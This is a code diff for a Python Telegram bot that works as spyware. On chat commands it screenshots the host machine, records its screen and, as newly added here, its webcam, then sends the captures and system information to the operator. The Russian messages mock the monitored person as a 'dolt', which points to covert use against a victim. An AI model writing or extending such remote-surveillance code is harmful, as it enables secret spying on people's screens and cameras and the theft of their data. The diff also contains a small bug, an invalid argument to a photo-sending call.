@@ -7,17 +7,18 @@ from aiogram.filters.command import Command
 from aiogram.types import FSInputFile
 from getusersystem import get_system_info
 from recording.screen_recording import record_screen
+from recording.camera_recording import record_video
 from dotenv import load_dotenv
 
 load_dotenv()
 
 DEFAULT_DURATION_SEC = 5
-DEFAULT_FPS = 10
-LOCALAPDATA_PATH = os.getenv('LOCALAPPDATA')
+DEFAULT_FPS = 15
 SCREEN_PATH = f'screenshot_from_olux.png'
 VIDEO_PATH = f"Recorded_screen.mp4"
-api_token = os.getenv('API_TOKEN')
-
+CAMERA_VIDEO_PATH = ''
+api_token_env = os.getenv('API_TOKEN')
+api_token = "-"
 
 async def main():
     bot = Bot(token=api_token)
@@ -25,18 +26,18 @@ async def main():
 
     @dp.message(Command('001'))
     @dp.message(Command('cheese'))
-    async def createScreenshot(message: types.Message):
+    async def create_window_screenshot(message: types.Message):
         screen_oluxa = pyautogui.screenshot()
         screen_oluxa.save(SCREEN_PATH)
         output_photo = FSInputFile(SCREEN_PATH)
 
-        await message.answer_photo(photo=output_photo)
-        await message.answer(str(get_system_info()))
+        await message.answer_photo(photo=output_photo,
+                                   textwrap=str(get_system_info()))
         os.remove(SCREEN_PATH)
 
     @dp.message(Command('002'))
     @dp.message(Command('screenView'))
-    async def recording(message: types.Message):
+    async def recording_window_screen(message: types.Message) -> None:
         """/screenView <seconds> <fps>"""
         chat_id = message.chat.id
         duration = DEFAULT_DURATION_SEC
@@ -46,7 +47,7 @@ async def main():
 
         if len(args) > 1 and args[1].isdigit():
             requested_duration = int(args[1])
-            if 1 <= requested_duration <= 60:  # Ограничение 60
+            if 1 <= requested_duration <= 60:
                 duration = requested_duration
             else:
                 await message.answer("Длительность должна быть от 1 до 60 секунд")
@@ -60,14 +61,7 @@ async def main():
                 await message.answer("FPS должен быть от 1 до 60")
                 return
 
-        if len(args) == 1:
-            await message.answer(
-                f"Использую настройки по умолчанию: {duration} сек, {fps} FPS. "
-                f"Для изменения используйте формат: `/000 <секунды> <фпс>`\n"
-                f"Например: `/000 10 60`"
-            )
-
-        await message.answer(f"Начинаю запись экрана на {duration} секунд, {fps} FPS...")
+        await message.answer(f"{duration} секунд, {fps} FPS...")
 
         loop = asyncio.get_running_loop()
         try:
@@ -79,7 +73,7 @@ async def main():
             return
 
         if success and os.path.exists(VIDEO_PATH):
-            await message.answer("Запись экрана завершена. Отправляю видео...")
+            await message.answer("Запись экрана олуха завершена.")
 
             try:
                 video_file = FSInputFile(VIDEO_PATH)
@@ -89,25 +83,56 @@ async def main():
                     video=video_file,
                     caption=f"Видео с экрана ({duration} сек, {fps} FPS)"
                 )
+
+            except Exception as e:
+                await message.answer(f"Ошибка при отправке видео: {e}")
+            finally:
+                os.remove(VIDEO_PATH)
+
+        else:
+            await message.answer(f"Не удалось записать экран. Причина: {error_msg}")
+
+    @dp.message(Command('003'))
+    @dp.message(Command('cameraView'))
+    async def recording_camera_video(message: types.Message):
+        chat_id = message.chat.id
+
+        await message.answer("Начинаю запись")
+
+        loop = asyncio.get_running_loop()
+        try:
+            success = await loop.run_in_executor(
+                None, record_video, VIDEO_PATH, DEFAULT_DURATION_SEC, DEFAULT_FPS
+            )
+        except Exception as e:
+            await message.answer(f"ошибка при записи видео: {e}")
+            return
+
+        if success and os.path.exists(VIDEO_PATH):
+            await message.answer("Запись завершена.")
+
+            try:
+                video_file = types.FSInputFile(VIDEO_PATH)
+
+                await bot.send_video(
+                    chat_id=chat_id,
+                    video=video_file,
+                    caption="Видео с веб-камеры (5 сек, 15 FPS)"
+                )
                 await message.answer("Видео успешно отправлено!")
 
             except Exception as e:
                 await message.answer(f"Произошла ошибка при отправке видео: {e}")
+
             finally:
                 os.remove(VIDEO_PATH)
-                print(f"Локальный файл {VIDEO_PATH} удален.")
 
         else:
-            await message.answer(f"❌ Не удалось записать экран. Причина: {error_msg}")
-
-    @dp.message(Command('003'))
-    @dp.message(Command('cameraView'))
-    async def record_camera_video(message: types.Message):
-        pass
+            await message.answer("Проверьте подключение веб-камеры.")
 
     @dp.message(Command('004'))
     @dp.message(Command('usersystem'))
-    async def getfullsysteminfo(message: types.Message):
+    async def get_full_system_info(message: types.Message):
         await message.answer(str(get_system_info(True)))
 
     await dp.start_polling(bot)
